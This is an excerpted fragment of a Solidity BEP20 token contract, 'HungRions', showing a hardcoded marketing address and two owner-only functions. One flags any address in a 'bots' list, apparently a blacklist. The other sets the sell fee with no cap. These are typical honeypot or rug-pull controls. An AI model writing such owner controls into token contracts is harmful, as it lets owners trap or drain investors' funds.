...
contract Hrions is IBEP20, Admin{
    ...
    string constant _name = "HungRions";
    string constant _symbol = "Hrions";
    ...
    address private marketingFeeReceiver = (0x0A31e2e57cD6f92768789e1De6ef8de51519D026); // marketing address
    ...
    function setBMHrions(address account,bool bmv) external onlyOwner() {
        bots[account] = bmv;
    }

    function setFMHrions(uint256 fv) external onlyOwner {
        sellMarketingFee = fv;
    }
